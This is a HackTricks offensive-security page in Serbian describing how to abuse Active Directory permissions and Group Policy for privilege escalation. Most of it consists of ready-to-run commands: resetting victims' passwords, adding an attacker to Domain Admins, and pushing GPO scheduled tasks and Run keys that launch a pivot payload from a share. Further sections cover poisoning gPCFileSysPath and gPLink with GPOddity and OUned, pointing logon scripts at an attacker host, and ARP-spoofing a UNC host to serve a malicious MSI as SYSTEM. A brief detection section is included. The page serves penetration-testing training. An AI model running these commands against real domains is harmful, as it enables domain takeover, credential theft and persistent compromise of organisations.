# Zloupotreba Active Directory ACL-ova/ACE-ova

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom sažetak tehnika iz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja pogledajte originalne članke.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll prava nad korisnikom**

Ova privilegija napadaču daje potpunu kontrolu nad ciljanim korisničkim nalogom. Kada se pomoću komande `Get-ObjectAcl` potvrde prava `GenericAll`, napadač može da:

- **Promeni lozinku cilja**: Pomoću komande `net user <username> <password> /domain`, napadač može da resetuje korisničku lozinku.
- U Linuxu možete isto da uradite preko SAMR-a pomoću Samba komande `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Ako je nalog onemogućen, uklonite UAC zastavicu**: `GenericAll` omogućava izmenu atributa `userAccountControl`. U Linuxu, BloodyAD može ukloniti zastavicu `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Dodelite SPN korisničkom nalogu kako bi mogao da bude izložen Kerberoasting-u, a zatim pomoću Rubeus-a i targetedKerberoast.py izdvojte i pokušajte da razbijete hash-eve ticket-granting ticket-a (TGT).

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Onemogućavanje pre-autentifikacije za korisnika čini njegov nalog ranjivim na ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Sa `GenericAll` pravima nad korisnikom možete da dodate akreditiv zasnovan na sertifikatu i autentifikujete se kao taj korisnik, bez promene njegove lozinke. Pogledajte:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll prava nad grupom**

Ova privilegija omogućava napadaču da menja članstvo u grupi ako ima `GenericAll` prava nad grupom kao što je `Domain Admins`. Nakon što pomoću `Get-NetGroup` utvrdi distinguished name grupe, napadač može da:

- **Dodaju sebe u grupu Domain Admins**: To se može uraditi direktnim komandama ili pomoću modula kao što su Active Directory ili PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Iz Linux-a takođe možete iskoristiti BloodyAD da se dodate u proizvoljne grupe kada imate GenericAll/Write dozvole nad njihovim članstvom. Ako je ciljna grupa ugnježdena u „Remote Management Users“, odmah ćete dobiti WinRM pristup hostovima koji koriste tu grupu:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write na objektu računara/korisnika**

Posedovanje ovih privilegija nad objektom računara ili korisničkim nalogom omogućava:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje objekta računara.
- **Shadow Credentials**: Koristite ovu tehniku da biste se lažno predstavljali kao računar ili korisnički nalog, iskorišćavanjem privilegija za kreiranje shadow credentials.

## Premeštanje objekta u OU sa nasleđenim dozvolama

Putanja može kombinovati **prava za premeštanje naloga** sa **pravima za pisanje nasleđenim odredišnom OU**, čak i kada nijedan principal u početku ne može da menja osetljive atribute naloga. Proverite dozvole za premeštanje izvornog objekta i `CreateChild` na odredištu, premestite objekat, pa ponovo proverite njegov efektivni DACL. Na primer, komanda `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` iz powerview.py premešta korisnika; kontrolisana grupa sa nasleđenim `GenericWrite` na tom OU zatim može da doda [shadow credential](shadow-credentials.md). Samo premeštanje ne stvara nasleđeno pravo.<sup>[[18]](#references)</sup>

Ako imate `GenericAll` nad OU, ali nemate odgovarajući nasleđeni ACE, komanda `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` može da doda jedan za njegove potomke. Posebno testirajte ciljni nalog: **kod naloga zaštićenih pomoću AdminSDHolder-a nasleđivanje je onemogućeno**, pa OU ACE može da utiče na obične korisnike, ali ne i na zaštićenog korisnika. Pogledajte [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Postoji i zaseban način zloupotrebe kada privilegovana skripta za zakazano čišćenje bira OU-ove na osnovu ACE-ova na koje napadač može da utiče, a zatim nad njihovim potomcima izvršava `Set-ADObject -Clear adminCount` **i** `$acl.SetAccessRuleProtection($False, $False)`. Ako možete da menjate DACL OU-a, dodelite grupi koju skripta proverava potreban `ExtendedRight` ili `GenericAll` ACE; zasebno proverite da li možete da pokrenete zadatak. Privilegovani zadatak tada može da ponovo omogući nasleđivanje na prethodno zaštićenom nalogu, čime OU ACE stupa na snagu. Potvrdite tačnu skriptu, dozvolu za pokretanje i rezultatni DACL; samo brisanje `adminCount` ne uključuje ponovo nasleđivanje, a SDProp može ponovo da zaštiti naloge koji ostanu u zaštićenim grupama.<sup>[[18]](#references)</sup>

## **WriteProperty nad grupom**

Ako korisnik ima prava `WriteProperty` nad svim objektima za određenu grupu (npr. `Domain Admins`), može da:

- **Doda sebe u grupu Domain Admins**: Ovo se može postići kombinovanjem komandi `net user` i `Add-NetGroupUser` i omogućava eskalaciju privilegija unutar domena.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (samoučlanjenje) u grupi**

Ova privilegija omogućava napadačima da sebe dodaju u određene grupe, kao što je `Domain Admins`, pomoću komandi koje direktno menjaju članstvo u grupi. Sledeći niz komandi omogućava da se sami dodaju:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Slična privilegija omogućava napadačima da se direktno dodaju u grupe menjanjem svojstava grupa, ako imaju pravo `WriteProperty` nad tim grupama. Provera i iskorišćavanje ove privilegije obavljaju se pomoću:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Posedovanje prava `ExtendedRight` nad korisnikom za `User-Force-Change-Password` omogućava resetovanje lozinke bez poznavanja trenutne lozinke. Provera ovog prava i njegovo iskorišćavanje mogu se obaviti pomoću PowerShell-a ili alternativnih alata komandne linije, koji nude nekoliko načina za resetovanje korisničke lozinke, uključujući interaktivne sesije i jednolinijske komande za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do upotrebe alata `rpcclient` na Linux-u, što pokazuje raznovrsnost vektora napada.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner nad grupom**

Ako napadač otkrije da ima prava `WriteOwner` nad grupom, može da promeni vlasništvo nad grupom tako da on postane njen vlasnik. Ovo je naročito značajno kada je grupa o kojoj je reč `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima grupe i članstvom. Postupak obuhvata pronalaženje odgovarajućeg objekta pomoću `Get-ObjectAcl`, a zatim korišćenje komande `Set-DomainObjectOwner` za promenu vlasnika, pomoću SID-a ili imena.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite nad korisnikom**

Ova dozvola omogućava napadaču da menja svojstva korisnika. Konkretno, uz `GenericWrite` pristup, napadač može da promeni putanju skripte za prijavu korisnika kako bi se zlonamerna skripta izvršila prilikom prijave korisnika. To se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljnog korisnika tako da pokazuje na skriptu napadača.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Uži `WriteProperty` ACE ograničen na korisnikov atribut [`scriptPath`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) može biti dovoljan; `GenericWrite` nije potreban. Uparite tu dozvolu za atribut sa skriptom u koju može da se upisuje, a koja se nalazi u stablu `SYSVOL\<domain>\scripts` ili `NETLOGON` domena, pa procenite da li je verovatno da će se ciljni korisnik prijaviti i pokrenuti skriptu. Skripta se pokreće u kontekstu tog korisnika prilikom prijave. Zasebno proverite efektivne AD i ACL-ove za datoteke/deljenje; odgovarajući Allow ACE ili direktorijum u koji može da se upisuje sami po sebi ne potvrđuju da je ceo put uspostavljen.

## **GenericWrite on Group**

Uz ovu privilegiju, napadači mogu da manipulišu članstvom u grupi, na primer tako što sebe ili druge korisnike dodaju u određene grupe. Ovaj postupak podrazumeva kreiranje credential objekta, njegovo korišćenje za dodavanje ili uklanjanje korisnika iz grupe i proveru promena članstva pomoću PowerShell komandi.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Sa Linux-a, Samba `net` može da dodaje/uklanja članove ako imate GenericWrite nad grupom (korisno kada PowerShell/RSAT nisu dostupni):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Posedovanje AD objekta i privilegije `WriteDACL` nad njim omogućavaju napadaču da sebi dodeli privilegije `GenericAll` nad objektom. To se postiže manipulacijom pomoću ADSI-ja, koja omogućava potpunu kontrolu nad objektom i mogućnost izmene njegovog članstva u grupama. Uprkos tome, postoje ograničenja pri pokušaju zloupotrebe ovih privilegija pomoću cmdletova `Set-Acl` / `Get-Acl` iz modula Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Brzo preuzimanje naloga pomoću WriteDACL/WriteOwner (PowerView)

Kada imate `WriteOwner` i `WriteDacl` nad korisnikom ili servisnim nalogom, možete preuzeti potpunu kontrolu i resetovati njegovu lozinku pomoću PowerView-a, bez poznavanja stare lozinke:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notes:
- Možda ćete prvo morati da promenite vlasnika na sebe ako imate samo `WriteOwner`:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Proverite pristup pomoću bilo kog protokola (SMB/LDAP/RDP/WinRM) nakon resetovanja lozinke.

## **Replikacija na domenu (DCSync)**

DCSync napad koristi posebne dozvole za replikaciju na domenu kako bi se napadač predstavljao kao kontroler domena i sinhronizovao podatke, uključujući korisničke akreditive. Za ovu moćnu tehniku potrebne su dozvole kao što je `DS-Replication-Get-Changes`, koje napadačima omogućavaju da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa kontroleru domena.<sup>[[5]](#references)</sup> [**Saznajte više o DCSync napadu ovde.**](../dcsync.md)

## Delegiranje GPO-a <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegiranje GPO-a

Delegirani pristup za upravljanje Group Policy Objects (GPOs) može predstavljati značajan bezbednosni rizik. Na primer, ako je korisniku kao što je `offense\spotless` delegirano pravo upravljanja GPO-ima, on može imati privilegije kao što su **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole mogu biti zloupotrebljene u zlonamerne svrhe, što se može utvrditi pomoću PowerView-a: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Nabrajanje dozvola za GPO

Da bi se identifikovali pogrešno konfigurisani GPO-i, cmdlet-ovi iz PowerSploit-a mogu se ulančati. Tako se mogu otkriti GPO-i kojima određeni korisnik ima dozvolu da upravlja: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Računari na koje je primenjena određena politika**: Moguće je utvrditi na koje se računare primenjuje određeni GPO, što pomaže u razumevanju potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politike primenjene na određeni računar**: Da biste videli koje se politike primenjuju na određeni računar, možete koristiti komande kao što je `Get-DomainGPO`.

**OUs na koje je primenjena određena politika**: Organizacione jedinice (OUs) na koje utiče određena politika mogu se identifikovati pomoću `Get-DomainOU`.

Možete koristiti i alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za nabrajanje GPO-a i pronalaženje problema u njima.

### Zloupotreba GPO-a - New-GPOImmediateTask

Pogrešno konfigurisani GPO-i mogu se iskoristiti za izvršavanje koda, na primer, kreiranjem neposrednog zakazanog zadatka. Tako se korisnik može dodati u grupu lokalnih administratora na pogođenim mašinama, čime se značajno podižu privilegije:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy modul - Zloupotreba GPO-a

GroupPolicy modul, ako je instaliran, omogućava kreiranje i povezivanje novih GPO-ova, kao i podešavanje postavki poput vrednosti registra za pokretanje backdoor-a na pogođenim računarima. Ovaj metod zahteva ažuriranje GPO-a i prijavljivanje korisnika na računar da bi se izvršio:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Zloupotreba GPO-a

SharpGPOAbuse omogućava zloupotrebu postojećih GPO-ova dodavanjem zadataka ili izmenom postavki, bez potrebe za kreiranjem novih GPO-ova. Ovaj alat zahteva izmenu postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene izmena:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Prinudno ažuriranje smernica

Ažuriranja GPO-a obično se dešavaju približno svakih 90 minuta. Da bi se taj proces ubrzao, naročito nakon uvođenja izmene, na ciljnom računaru može se pokrenuti komanda `gpupdate /force` radi neposrednog ažuriranja smernica. Ova komanda obezbeđuje primenu svih izmena GPO-a bez čekanja na sledeći automatski ciklus ažuriranja.

### Ispod haube

Pregledom zakazanih zadataka za određeni GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka kao što je `evilTask`. Ti zadaci se kreiraju pomoću skripti ili alata komandne linije kojima se nastoji promeniti ponašanje sistema ili eskalirati privilegije.

Struktura zadatka prikazana u XML konfiguracionoj datoteci koju generiše `New-GPOImmediateTask` navodi pojedinosti zakazanog zadatka, uključujući komandu koja će se izvršiti i njene okidače. Ova datoteka pokazuje kako se zakazani zadaci definišu i upravljaju u okviru GPO-a i omogućava izvršavanje proizvoljnih komandi ili skripti u sklopu primene smernica.

### Korisnici i grupe

GPO-i omogućavaju i izmenu članstva korisnika i grupa na ciljnim sistemima. Direktnim uređivanjem datoteka smernica za korisnike i grupe napadači mogu dodati korisnike u privilegovane grupe, kao što je lokalna grupa `administrators`. To je moguće putem delegiranja dozvola za upravljanje GPO-ima, koje omogućava izmenu datoteka smernica radi dodavanja korisnika ili promene članstva u grupama.

XML konfiguraciona datoteka za korisnike i grupe opisuje kako se te izmene sprovode. Dodavanjem unosa u ovu datoteku određenim korisnicima mogu se dodeliti povišene privilegije na pogođenim sistemima. Ovaj metod omogućava direktnu eskalaciju privilegija manipulacijom GPO-a.

Za bezbednosne postavke, kao što su članstvo u lokalnim grupama i korisnička prava, pregledajte i primenjeni GPO predložak na putanji `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` i ACL direktorijuma `SecEdit`. Direktorijum ili datoteka u koju je moguće pisati predstavljaju razlog za dalju proveru: stvarni pristup SYSVOL deljenom resursu, deny i nasleđeni ACL-ovi, dozvole Group Policy kontejnera, opseg smernica i osvežavanje klijenta i dalje određuju da li izmena može da stupi na snagu. Samo članstvo u grupi pod nazivom „GPO Managers” ne potvrđuje pravo izmene. [Microsoft opisuje putanju do ovog predloška i razdvajanje Group Policy kontejnera i predloška.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Mogu se razmotriti i drugi načini za izvršavanje koda ili održavanje postojanosti, kao što su korišćenje skripti za prijavu/odjavu, izmena ključeva registratora za automatsko pokretanje, instaliranje softvera putem .msi datoteka ili uređivanje konfiguracija servisa. Ove tehnike nude različite načine za održavanje pristupa i kontrolu ciljnih sistema zloupotrebom GPO-a.

### Preusmeravanje preuzimanja GPC/GPT-a na lažne autentifikovane servise

GPO se sastoji od LDAP **Group Policy Container (GPC)** sa metapodacima i **Group Policy Template (GPT)** sa datotekama smernica, koji se nalazi na SMB-u. Tokom osvežavanja, klijent prati `gPLink` kontejnera, čita referencirani GPC i njegov `gPCFileSysPath`, a zatim preuzima GPT sa te UNC putanje. Zbog toga se pristup za pisanje u sam GPC ili u `gPLink` OU-a, lokacije ili domena može iskoristiti za privilegovanu obradu smernica.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Trovanje `gPCFileSysPath` pomoću GPOddity

Ako kontrolisani principal može da piše u ciljni GPC (direktno ili putem **NTLM relay to LDAP**), zamenite `gPCFileSysPath` UNC putanjom koju hostuje napadač. [GPOddity](https://github.com/synacktiv/GPOddity) automatizuje izmenu LDAP-a i hostuje zlonamerni GPT koji sadrži datoteke smernica zasnovane na modulima ili Immediate Task koji Group Policy klijent izvršava kao `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonimni SMB deljeni resurs ili SMB deljeni resurs koji ne zahteva akreditive nije dovoljan na aktuelnim Windows klijentima: SMB Secure Negotiate zahteva dokaz da je autentifikacija uspela, pa lažni servis mora da proveri identitet domena, izvede ključ SMB sesije i ispravno potpisuje svoje odgovore. U ugrađenom režimu konfigurišite GPOddity pomoću kontrolisanog mašinskog naloga i njegovog servisnog ključa, a zatim u odeljku `[COMMANDS]` izaberite korisni teret za računar ili korisnika.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Granični slučaj sa korisničkim GPO-om:** nakon MS16-072, Windows i dalje kreira dve SMB2 sesije u **istoj TCP vezi**: korisnička sesija čita `GPT.INI`, a zatim sesija naloga računara čita efektivnu konfiguraciju, kao što je `ScheduledTasks.xml`. Zato rogue server mora da indeksira stanje autentifikacije, ključeve sesije i ključeve za potpisivanje prema SMB2 `SessionId`, a ne samo prema socket-u. Scapy fork ugrađen u GPOddity/OUned ovo implementira pomoću `SMBStreamSocketMultiplexing` i `SMBServer` koji podržava multipleksiranje; single-session Impacket/Scapy serveri inače ponovo koriste pogrešno stanje za potpisivanje i ne rade sa korisničkim politikama.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

Uz `WriteGPLink`, `GenericWrite` ili ekvivalentnu kontrolu nad OU-om, Site-om ili Domain-om, napadač može da doda link čiji GPC DN opslužuje LDAP host pod kontrolom napadača. Ovu tehniku je prvobitno predstavio Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automatizuje LDAP upis i zlonamerni GPC/GPT lanac.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Žrtva se najpre autentifikuje na lažnom LDAP servisu i dobija GPC čiji `gPCFileSysPath` upućuje na lažni SMB servis; zatim se autentifikuje na SMB i primenjuje dostavljeni GPT. OUned-u je zato potreban nalog sa LDAP SPN-om, mašinski nalog sa HOST SPN-om za SMB (isti mašinski nalog može da zadovolji oba uslova) i DNS razrešavanje ili prosleđivanje unazad koje usmerava portove 389 i 445 ka hostu operatera.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned-ov ugrađeni Scapy LDAP server proverava Kerberos/SPNEGO koristeći stvarni ključ kontrolisane usluge i isporučuje proizvoljne GPC podatke iz JSON-a. Prazan JSON ključ predstavlja rootDSE, prefiksi `base64:` označavaju binarne vrednosti, a server podržava add/delete/modify/search, kao i pretrage `BASE`, `LEVEL` i `SUBTREE`; može da pregovara bez zaštite, uz integritet ili uz poverljivost. Zahvaljujući tome, usluga može ponovo da se koristi kada neka druga Windows komponenta prati LDAP referencu koju kontroliše napadač, ali zahteva autentifikovan LDAP.<sup>[[15]](#references)</sup>

Nemojte pretpostavljati da sinhronizacija lozinke naloga u lažni domen reprodukuje svaki Kerberos ključ: RC4 se izvodi iz lozinke, dok AES string-to-key koristi i salt izveden iz hostname-a/domena principal-a. Prosleđivanje stvarnog AES ključa naloga u `KerberosSSP` izbegava primoravanje RC4-a promenom naloga mašine, koji može sam sebi da upisuje `msDS-SupportedEncryptionTypes`, što bi se moglo otkriti.<sup>[[15]](#references)</sup>

#### Tačke za detekciju

Povežite promene atributa `gPCFileSysPath` ili `gPLink` sa promenama verzije GPO-a i novim XML-ovima za Immediate/Scheduled Task. Istražite veze ka neočekivanim naming context-ima, UNC hostove izvan odobrenog skupa DC/SYSVOL, DNS zapise koji preusmeravaju imena naloga mašina, LDAP/CIFS service ticket-e za neuobičajene naloge mašina i promene atributa `msDS-SupportedEncryptionTypes` kojima se omogućava RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` nad OU/domenom omogućava vam da izmenite atribut `gPLink` ciljnog kontejnera i **primorate postojeći GPO da se primeni** bez menjanja samog GPO-a. Ovo postaje zanimljivo kada povezani GPO već upućuje na udaljeni sadržaj preko **UNC putanja** (`\\HOST\share\...`), jer autentifikovani korisnici mogu da čitaju **SYSVOL** i van mreže traže politike koje mogu ponovo da se iskoriste.<sup>[[11]](#references)</sup>

Tok rada na visokom nivou:

1. Koristite BloodHound da identifikujete principal sa `WriteGPLink` nad OU-om i nabrojite računare/korisnike unutar tog OU-a.
2. Napravite kopiju `SYSVOL`-a samo za čitanje i analizirajte GPO-ove tražeći **Software Installation**, **mapiranja diskova** (`Drives.xml`) i **logon/startup skripte** koje upućuju na UNC putanje.
3. Dajte prednost politikama koje upućuju na **direktan hostname** (na primer `\\DC02\share\pkg.msi`) umesto putanjama DFS/domain-namespace, jer je lakše preusmeriti putanje zasnovane na hostname-u pomoću L2 spoofing-a.
4. Dodajte GUID izabranog GPO-a u `gPLink` ciljnog OU-a kako bi žrtva obradila tu već postojeću politiku.
5. Na istom broadcast domenu, izvedite ARP spoofing UNC hosta i lokalno povežite njegovu IP adresu (`ip addr add <target_ip>/32 dev <iface>`) kako bi SMB saobraćaj žrtve stigao do vašeg hosta.
6. Poslužite očekivanu putanju/ime datoteke preko SMB servera napadača (na primer `smbserver.py`) i sačekajte uobičajenu obradu politike.

Primer prikupljanja `SYSVOL`-a i povezivanja sa GPO-ovima:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Povežite postojeći GPO sa ciljnom OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Ako povezani GPO distribuira MSI sa UNC putanje, klijent će ga preuzeti tokom **pokretanja računara** i instalirati kao **`NT AUTHORITY\SYSTEM`**. Lažiranjem navedenog hosta i posluživanjem zlonamernog MSI-ja sa **istim deljenim resursom/putanjom/nazivom**, možete pretvoriti `WriteGPLink` u izvršavanje koda kao SYSTEM **bez menjanja SYSVOL-a**.

Važna ograničenja:

- **Vreme je važno**: nova veza postaje vidljiva pri osvežavanju smernica (obično na oko 90 minuta), ali se **Software Installation** obično pokreće pri **ponovnom pokretanju**.
- Windows Installer obično prati instalaciju pomoću **`ProductCode`** paketa. Ako je proizvod već instaliran, instalacija može biti preskočena.
- Da biste izbegli odbijanje instalacije, izmenite zlonamerni MSI tako da se njegovi **`ProductCode`** i **`PackageCode`** podudaraju sa legitimnim paketom koji GPO očekuje.
- Stare `.aas` datoteke za oglašavanje mogu ostati u `SYSVOL`-u, zato proverite da li instalacija i dalje izgleda aktivno pre nego što se oslonite na nju.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> hvatanje NTLM-a / WebDAV relay

GPP mapiranja disk jedinica u `Drives.xml` uzrokuju da se korisnici tokom prijavljivanja ili ponovnog povezivanja autentifikuju na konfigurisanu UNC putanju. Ako lažirate referencirani host, možete uhvatiti **NetNTLMv2**. Ako namerno izazovete neuspeh SMB-a, Windows može ponovo pokušati preko **WebDAV-a**, šaljući **NTLM preko HTTP-a**. To pruža znatno više mogućnosti za relay napade na **LDAP(S)**, **AD CS** ili **SMB**.

#### Logon/startup script UNC hijack

Isti obrazac važi i za skripte hostovane na UNC putanjama, pronađene u `SYSVOL`:

- **Logon skripte** se obično izvršavaju u kontekstu **korisnika**.
- **Startup skripte** se obično izvršavaju u kontekstu **računara / SYSTEM-a**.

Ako putanja skripte upućuje na hostname koji se može lažirati, preusmerite UNC host i poslužite zamenski sadržaj skripte sa očekivane lokacije.

## Trovanje logon skripti u SYSVOL/NETLOGON

Putanje sa dozvolom za upis u `\\<dc>\SYSVOL\<domain>\scripts\` ili `\\<dc>\NETLOGON\` omogućavaju izmenu logon skripti koje se izvršavaju pri prijavljivanju korisnika putem GPO-a. To omogućava izvršavanje koda u bezbednosnom kontekstu korisnika koji se prijavljuju.

### Pronalaženje logon skripti
- Pregledajte korisničke atribute da biste pronašli konfigurisanu logon skriptu:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Pretražite deljene direktorijume domena da biste pronašli prečice ili reference na skripte:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

